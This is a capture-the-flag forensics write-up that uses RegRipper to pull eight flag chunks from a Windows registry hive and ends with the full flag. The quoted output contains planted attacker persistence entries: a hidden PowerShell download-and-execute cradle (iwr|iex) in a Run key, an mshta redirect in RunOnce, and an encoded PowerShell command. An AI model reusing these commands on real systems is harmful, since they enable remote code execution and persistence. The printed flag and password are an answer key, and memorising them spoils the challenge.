### Chall description
```
Category: Forensics

Sheesh! Some threat actor sure did let it rip on this host! We've been able to uncover a file that may help with incident response.
The password to the ZIP archive is beyblade.
This challenge has the flag MD5 hash value separated into chunks. You must uncover all of the different pieces and put them together with the flag{ and } suffix to submit.
```

### Procedure

File has not extension, run `file` command to know what it is.
```bash
file beyblade

## output
beyblade: MS Windows registry file, NT/2000 or above
```

Windows regedit file, we can use `RegRipper` to inspect this one. What modules can we use first for this forensic investigation?, I have started with:
* recentdocs
  * What: MRU list of recently opened documents (per-user).
  * Where: HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs and associated shell link files in %APPDATA%\Microsoft\Windows\Recent.
  * Why useful: Shows recently opened filenames (possible evidence of user activity or file access).

* recentapps
  * What: MRU information about recently used applications (often used to build Start menu / jump lists).
  * Where: HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentApps and Jump Lists in %APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations / CustomDestinations.
  * Why useful: Identifies which programs were launched recently and from where.

* shellbags
  * What: Registry structures recording folder view/navigation history (captures folder paths even if deleted).
  * Where: NTUSER.DAT keys: Software\Microsoft\Windows\Shell\Bags / BagMRU and also Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU + Bags.
  * Why useful: Reconstructs folder access history (including external drives, USB paths), often survives file deletion.

* fileless
  * What: Generic label for in-memory or non-file persistence/exec techniques (e.g., PowerShell in-memory, WMI event subscriptions, registry-based script blocks).
  * Where: artifacts include: PowerShell event logs (Microsoft-Windows-PowerShell/Operational), HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run style keys used to launch scripts, WMI repository (event consumers/subscriptions), scheduled tasks that execute scripts, process memory (volatile).
  * Why useful: Indicates techniques that leave little on-disk footprint — often attackers use these for stealth.

* run
  * What: Persistent autostart keys used to launch programs at logon.
  * Where: HKLM\Software\Microsoft\Windows\CurrentVersion\Run and HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
  * Why useful: Shows binaries or commands set to run automatically — common persistence mechanism.

* runmru
  * What: MRU list of commands entered in Start→Run.
  * Where: HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU.
  * Why useful: Reveals commands/paths the user executed manually (including diagnostic or attacker commands).

* runonce
  * What: Keys that execute a command once at next logon and then get removed.
  * Where: HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce and HKCU\...\RunOnce.
  * Why useful: Used for one-off persistence/installation tasks or cleanup by attackers.

* autorun
  * What: Ambiguous term — usually refers to autorun/autoplay entries (autorun.inf on removable media) and autorun-style registry run keys.
  * Where: autorun.inf on media roots; registry run keys listed above. Also HKLM\SYSTEM\CurrentControlSet\services for service autorun.
  * Why useful: autorun.inf can reveal removable-media activity; registry/service autorun reveals persistence.

* typedurls
  * What: URLs manually typed into Internet Explorer / legacy Edge address bar.
  * Where: HKCU\Software\Microsoft\Internet Explorer\TypedURLs. (Also browser-specific history/databases for modern browsers.)
  * Why useful: Shows websites the user intentionally visited (useful for user intent / browsing history).

* tasks
  * What: Scheduled Tasks (persistence or one-off jobs).
  * Where: Task definitions at C:\Windows\System32\Tasks (XML), and registry entries under HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache.
  * Why useful: Attackers use scheduled tasks for persistence, lateral movement, or privilege escalation. Task XML reveals actions, triggers, and command lines.
    
* typedpaths
  * What: MRU list of typed file/folder paths in Explorer dialogs (path typed into address bar).
  * Where: HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths.
  * Why useful: Shows exact paths a user navigated to manually (including network shares).

* teamviewer
  * What: TeamViewer client artifacts — config, logs, and sometimes connection info/IDs.
  * Where: %APPDATA%\TeamViewer\ (logs, settings), registry keys under HKLM\SOFTWARE\TeamViewer or HKCU\Software\TeamViewer.
  * Why useful: Shows remote access sessions, partner IDs, connection timestamps, sometimes authentication artifacts.

* tsclient
  * What: Terminal Services / RDP client artifacts (MRU server list, connected servers).
  * Where: HKCU\Software\Microsoft\Terminal Server Client\ (Servers, Default, MRU lists), and related RDP connection files (.rdp in user dirs).
  * Why useful: Reveals remote desktops accessed by the user — IPs/hostnames and last connect times.

* muicache
  * What: MUICache entries store display names of executables (path -> friendly name), used by Explorer.
  * Where: HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\MuiCache and older HKLM\SYSTEM\CurrentControlSet\Control\Windows\ variants.
  * Why useful: Reveals names and paths of executed binaries (even for deleted files) — often shows evidence of executed programs.

* apppaths
  *What: Registry keys used to define application executable paths (help Windows find EXEs).
  * Where: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\ and HKCU\... equivalents.
  * Why useful: Shows installed apps and their executable locations; attackers sometimes create AppPaths entries to facilitate execution.

Those modules were enough to recover the flag.


Flag:
  * piece:4/8-b34a
  * flag_value_1_of_8-47cb
    
```powershell
PS C:\Users\demo\Desktop\Forensics\RegRipper> .\rip.exe -r .\beyblade -p fileless
Launching fileless v.20200911
fileless v.20200911
(All) Scans a hive file looking for fileless malware entries
MITRE: T1059.001 (persistence)

Use of uninitialized value $list in pattern match (m//) at PERL2EXE_STORAGE/utf8_heavy.pl line 399.
**Possible fileless malware found.
Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
LastWrite time: 2025-09-27 19:16:23Z
Value Name: r1
Data: powershell.exe -e JABNAE0A; ## piece:4/8-b34a

**Possible fileless malware found.
Software\Microsoft\Windows\CurrentVersion\Run
LastWrite time: 2025-09-27 19:16:09Z
Value Name: Windows Update Monitor
Data: powershell -nop -w hidden -c iwr http://cdn.update-catalog[.]com/agent?v=1 -UseBasicParsing|iex ; # flag_value_1_of_8-47cb
```

Flag:
  * flag_value_1_of_8-47cb
  * hash-value-2-8_5cd4
```powershell
PS C:\Users\demo\Desktop\Forensics\RegRipper> .\rip.exe -r .\beyblade -p run
Launching run v.20220706
run v.20220706
(Software, NTUSER.DAT) Get autostart key contents from Software/user hives
MITRE: T1547.001 (persistence)

Software\Microsoft\Windows\CurrentVersion\Run
LastWrite Time 2025-09-27 19:16:09Z
  Windows Update Monitor - powershell -nop -w hidden -c iwr http://cdn.update-catalog[.]com/agent?v=1 -UseBasicParsing|iex ; # flag_value_1_of_8-47cb
  MicrosoftEdgeAutoLaunch_C46CFC0629905CC775E70B50EA8A519C - "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --no-startup-window --win-session-start
  OneDrive - "C:\Users\User\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background

Software\Microsoft\Windows\CurrentVersion\RunOnce
LastWrite Time 2025-09-27 19:16:23Z
  OneDrive Setup - cmd /c start /min mshta about:<script>location='http://telemetry.sync-live[.]net/bootstrap?stage=init&note=hash-value-2-8_5cd4'</script>
```

Flag:
  * piece:4/8-b34a

```powershell
PS C:\Users\demo\Desktop\Forensics\RegRipper> .\rip.exe -r .\beyblade -p runmru
Launching runmru v.20201005
runmru v.20201005
(NTUSER.DAT) Gets contents of user's RunMRU key
MITRE: T1204 (execution)

RunMru
Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
LastWrite Time 2025-09-27 19:16:23Z
MRUList =
r1   powershell.exe -e JABNAE0A; ## piece:4/8-b34a
```

Flags:
  * chunk+3of8:6d7b

```powershell
PS C:\Users\demo\Desktop\Forensics\RegRipper> .\rip.exe -r .\beyblade -p typedurls
Launching typedurls v.20201012
typedurls v.20201012
(NTUSER.DAT) Returns contents of user's TypedURLs key.

TypedURLs
Software\Microsoft\Internet Explorer\TypedURLs
LastWrite Time 2025-09-27 19:16:23Z
  url1 -> http://auth.live-sync[.]net/login?session=chunk+3of8:6d7b
```

Flags:
  * fragment-5_of_8-0d9c

```powershell
PS C:\Users\demo\Desktop\Forensics\RegRipper> .\rip.exe -r .\beyblade -p typedpaths
Launching typedpaths v.20201005
typedpaths v.20201005
(NTUSER.DAT) Gets contents of user's typedpaths key

Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths
LastWrite Time 2025-09-27 19:16:53Z

url1     C:\
url2     C:\Users\Public\fragment-5_of_8-0d9c
```

Flags:
  * segment-8-of-8=58de

```powershell
PS C:\Users\demo\Desktop\Forensics\RegRipper> .\rip.exe -r .\beyblade -p tsclient
Launching tsclient v.20200924
Launching tsclient v.20200924
(NTUSER.DAT) Displays contents of user's Terminal Server Client\Default key
MITRE: T1021.001 (lateral movement)

Software\Microsoft\Terminal Server Client\Default not found.

Software\Microsoft\Terminal Server Client\Servers
LastWrite time 2025-09-27 19:16:23Z

fileshare.local  LastWrite time: 2025-09-27 19:16:23Z
  UsernameHint: administrator|segment-8-of-8=58de
```
Flags:
  * component#7of8-99bb

```powershell
PS C:\Users\demo\Desktop\Forensics\RegRipper> .\rip.exe -r .\beyblade -p muicache
Launching muicache v.20221121
muicache v.20221121
(NTUSER.DAT,USRCLASS.DAT) Gets EXEs from user's MUICache key
MITRE: T1059 (program execution)

Software\Microsoft\Windows\ShellNoRoam\MUICache
LastWrite Time 2025-09-27 19:16:23Z

C:\Windows\System32\mmc.exe                                                      Microsoft Management Console - component#7of8-99bb

Analysis Tip: MUICache holds information from apps run by the user, incorporating metadata from the file's
.rsrc section, or file version information. This artifact does NOT include time stamps.

Ref: https://www.magnetforensics.com/blog/forensic-analysis-of-muicache-files-in-windows/
Ref: https://www.youtube.com/watch?v=ea2nvxN878s&t=2s
```

Flag:
  * shard(6/8)-315a

```powershell
PS C:\Users\demo\Desktop\Forensics\RegRipper> .\rip.exe -r .\beyblade -p apppaths
Launching apppaths v.20200813
apppaths v.20200813
(NTUSER.DAT,Software) Gets content of App Paths subkeys

2025-09-27 19:17:48Z
  olk.exe - C:\Program Files\WindowsApps\Microsoft.OutlookForWindows_1.2025.829.200_x64__8wekyb3d8bbwe\olk.exe
  olkMcpServer.exe - C:\Program Files\WindowsApps\Microsoft.OutlookForWindows_1.2025.829.200_x64__8wekyb3d8bbwe\olkMcpServer.exe
2025-09-27 19:16:23Z
  wmiprvse.exe - C:\Windows\System32\wmiprvse.exe /k netsvcs -tag shard(6/8)-315a
2025-09-27 18:29:52Z
  OneDriveFileLauncher.exe -
2025-09-27 18:28:55Z
  ms-teams.exe - C:\Program Files\WindowsApps\MSTeams_25241.203.3947.4411_x64__8wekyb3d8bbwe\ms-teams.exe
  ms-teamsupdate.exe - C:\Program Files\WindowsApps\MSTeams_25241.203.3947.4411_x64__8wekyb3d8bbwe\ms-teamsupdate.exe
2025-09-27 18:26:00Z
  WindowsPackageManagerServer.exe - C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_1.21.10120.0_x64__8wekyb3d8bbwe\WindowsPackageManagerServer.exe
  winget.exe - C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_1.21.10120.0_x64__8wekyb3d8bbwe\winget.exe
2025-09-27 18:25:58Z
  mspaint.exe - C:\Program Files\WindowsApps\Microsoft.Paint_11.2302.20.0_x64__8wekyb3d8bbwe\PaintApp\mspaint.exe
2025-09-27 18:25:57Z
  SnippingTool.exe - C:\Program Files\WindowsApps\Microsoft.ScreenSketch_11.2307.52.0_x64__8wekyb3d8bbwe\SnippingTool\SnippingTool.exe
2025-09-27 18:25:55Z
  notepad.exe - C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2312.18.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
2025-09-27 18:25:54Z
  wt.exe - C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\wt.exe
```

Flag: `flag{47cb5cd46d7bb34a0d9c315a99bb58de}`

